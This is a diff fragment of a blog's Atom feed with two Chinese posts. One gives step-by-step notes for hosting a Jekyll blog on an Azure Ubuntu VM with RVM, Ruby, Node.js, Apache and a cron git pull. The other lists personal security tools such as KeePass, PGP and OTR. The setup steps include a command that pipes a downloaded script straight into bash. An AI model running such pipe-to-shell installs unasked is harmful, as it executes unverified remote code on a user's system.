+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Gitcafe" scheme="http://jetwang99.github.io/tags/Gitcafe/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Azure上部署Jekyll blog的步骤</title>
+    <link href="http://jetwang99.github.io/2015/04/23/deploy-jekyll-blog-to-azure-vm/"/>
+    <id>http://jetwang99.github.io/2015/04/23/deploy-jekyll-blog-to-azure-vm/</id>
+    <published>2015-04-23T12:38:38.000Z</published>
+    <updated>2018-01-24T08:30:24.789Z</updated>
+    
+    <content type="html"><![CDATA[<hr><p>公司developer有MSDN Subscription的权限，于是每个月都有微软云服务Azure的赠送的50美金费用，具体优惠可以看这个 <a href="http://azure.microsoft.com/en-us/pricing/member-offers/msdn-benefits-details/" target="_blank" rel="noopener">链接</a>，之前一直想用这个福利做点什么,却一直不是很顺利，linux下搭建好的openvpn总是不能用（猜测应该是被GFW和谐了），Windows Server 2012下部署SSTP和L2TP VPN倒是成功翻墙，不过流量费耗的太快，50美金经不起折腾。</p><p>于是就想把博客再挪一个窝，现在做完了，记录以下步骤以备忘。博客地址：<a href="http://jetwang99.cloudapp.net" target="_blank" rel="noopener">该地址目前可能已关闭</a></p><a id="more"></a><p>1，安装Ubuntu 14.10虚拟机并配置Endpoint，我开了一系列端口方便管理</p><p>adminui    TCP    2943    2943    -<br>HTTP    TCP    80    80    -<br>http8080    TCP    8080    8080    -<br>HTTPS    TCP    443    443    -<br>jekyll    TCP    4000    4000    -<br>openvpn    TCP    2443    2443    -<br>openvpnserver    TCP    3194    3194    -<br>SSH    TCP    22    22    -<br>webmin    TCP    10000    10000    -</p><p>2，安装环境依赖</p><p>sudo apt-get update<br>sudo apt-get install git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties</p><p>3，安装rvm，然后安装ruby</p><p>sudo apt-get install libgdbm-dev libncurses5-dev automake libtool bison libffi-dev<br>curl -L <a href="https://get.rvm.io" target="_blank" rel="noopener">https://get.rvm.io</a> | bash -s stable<br>source ~/.rvm/scripts/rvm<br>echo “source ~/.rvm/scripts/rvm” &gt;&gt; ~/.bashrc<br>rvm install 2.1.2<br>rvm use 2.1.2 –default<br>ruby -v</p><p>echo “gem: –no-ri –no-rdoc” &gt; ~/.gemrc</p><p>4，安装Javascript runtime</p><p>sudo add-apt-repository ppa:chris-lea/node.js<br>sudo apt-get update<br>sudo apt-get install nodejs</p><p>5，安装rails</p><p>gem install rails<br>rbenv rehash</p><p>rails -v</p><p>6，配置github账户（这个之前早就搞定了）</p><p>git config –global color.ui true<br>git config –global user.name “YOUR NAME”<br>git config –global user.email “YOUR@EMAIL.com”<br>ssh-keygen -t rsa -C “YOUR@EMAIL.com”</p><p>cat ~/.ssh/id_rsa.pub</p><p>ssh -T git@github.com</p><p>7，安装apache</p><p>sudo apt-get install apache</p><p>8，在apache的/var/www/html下直接clone静态网站</p><p>cd /var/www/html; git clone <a href="https://github.com/xxx/xxx.github.io.git" target="_blank" rel="noopener">https://github.com/xxx/xxx.github.io.git</a></p><p>9，启动apache就发现博客可以访问了，现在设置定时任务自动克隆代码更新博客</p><p>#add crontab<br>0 5,9 <em> </em> * cd /var/www/html/; git pull;</p><p>#check cron service status<br>initctl start cron<br>initctl list | grep cron</p><p>Done.</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;hr&gt;
+&lt;p&gt;公司developer有MSDN Subscription的权限，于是每个月都有微软云服务Azure的赠送的50美金费用，具体优惠可以看这个 &lt;a href=&quot;http://azure.microsoft.com/en-us/pricing/member-offers/msdn-benefits-details/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;链接&lt;/a&gt;，之前一直想用这个福利做点什么,却一直不是很顺利，linux下搭建好的openvpn总是不能用（猜测应该是被GFW和谐了），Windows Server 2012下部署SSTP和L2TP VPN倒是成功翻墙，不过流量费耗的太快，50美金经不起折腾。&lt;/p&gt;
+&lt;p&gt;于是就想把博客再挪一个窝，现在做完了，记录以下步骤以备忘。博客地址：&lt;a href=&quot;http://jetwang99.cloudapp.net&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;该地址目前可能已关闭&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="azure" scheme="http://jetwang99.github.io/tags/azure/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>安全上网工具</title>
+    <link href="http://jetwang99.github.io/2015/04/22/security-tools/"/>
+    <id>http://jetwang99.github.io/2015/04/22/security-tools/</id>
+    <published>2015-04-22T15:12:12.000Z</published>
+    <updated>2018-01-24T08:30:24.808Z</updated>
+    
+    <content type="html"><![CDATA[<p>关于安全上网的专题，墙内可以关注月光博客 <a href="http://www.williamlong.info/cat/?tags=Security" target="_blank" rel="noopener">安全专区</a></p><p>强烈推荐普通人看看这篇文章 <a href="http://www.williamlong.info/archives/3660.html" target="_blank" rel="noopener">设计自己的密码规则，实现强壮的自我保护</a></p><p>更专业一点的，推荐 <a href="http://drops.wooyun.org/" target="_blank" rel="noopener">乌云知识库</a> <em>这个看起来难度有点大</em></p><p>墙外自不必说，文章就太多了，推荐 <a href="https://program-think.blogspot.com" target="_blank" rel="noopener">编程随想</a> <em>这个需要翻墙，你懂的</em></p><a id="more"></a><p>大概从毕业的时候起就一直关注月光博客，小众软件，善用佳软，对于安全类工具软件一直有不断尝鲜，但是很多用过之后发现不是自己想要的，或者是收费的，所以一段时间之后就删除了，所以至今保留下来的都是典藏版，今天总结一下。</p><p>按重要性优先级排序：</p><p>1，网银密码</p><p>这个必须脑力记忆，不过也是有技巧的</p><p>2，重要网站密码，譬如社保查询之类的</p><p>keepass 支持linux，加密文件可以通过网盘同步 <em>linux下面使用的时候中文字体会变成方框，这个待解决</em></p><p>3，一般性网站</p><p>lastpass 普通版本就够用，支持IE Chrome插件自动填充，不过不建议特别重要的密码用这个保存</p><p><a href="http://flowerpassword.com/" target="_blank" rel="noopener">花密</a> 从此上论坛再也不担心密码泄露了</p><p>4，邮件安全</p><p>这个嘛，终极方案还是PGP咯，gmail再好终究只是传输加密，内容还是容易暴露的，推荐：Chrome插件Mailvelope，PC端：gpg4usb</p><p>5，IM安全</p><p>鉴于99.9999%的同学只知道QQ，99.8888%的同学只知道QQ/MSN/SKYPE，我用的Pidgin加otr插件就显得太小众了，不过这个亲测加密有效，加密的聊天内容传输到手机端看到的会是乱码，从此再也不担心网管监控了</p><p>6，VPN （这个其实是另一个话题了）</p><p>关于翻墙的软件和相关话题实在太多了，不一一赘述。不过很多人最大的疑问是：翻墙干什么？呵呵，我想说，当你想看些高端一点的视频教程但是百度却发现找不到资源的时候，上Youtube的体验会让你惊喜。</p><p>暂时只想到这么多。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;关于安全上网的专题，墙内可以关注月光博客 &lt;a href=&quot;http://www.williamlong.info/cat/?tags=Security&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全专区&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;强烈推荐普通人看看这篇文章 &lt;a href=&quot;http://www.williamlong.info/archives/3660.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;设计自己的密码规则，实现强壮的自我保护&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;更专业一点的，推荐 &lt;a href=&quot;http://drops.wooyun.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;乌云知识库&lt;/a&gt; &lt;em&gt;这个看起来难度有点大&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;墙外自不必说，文章就太多了，推荐 &lt;a href=&quot;https://program-think.blogspot.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;编程随想&lt;/a&gt; &lt;em&gt;这个需要翻墙，你懂的&lt;/em&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="技术" scheme="http://jetwang99.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+    
+      <category term="Security" scheme="http://jetwang99.github.io/tags/Security/"/>
+    
+  </entry>
+  
+</feed>
